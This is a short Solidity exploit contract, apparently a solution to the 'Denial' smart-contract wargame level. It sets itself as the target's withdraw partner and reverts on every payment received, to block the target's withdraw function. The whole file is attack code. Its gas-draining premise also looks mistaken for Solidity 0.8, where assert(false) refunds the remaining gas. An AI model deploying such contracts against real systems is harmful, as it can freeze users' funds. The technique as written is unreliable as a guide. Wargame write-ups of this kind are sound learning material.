//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}

contract DenialHacker {

    IDenial denial;

    constructor(IDenial _denial) {
        denial = _denial;
    }

    function setWithdrawPartner() external {
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        assert(false);
    }
}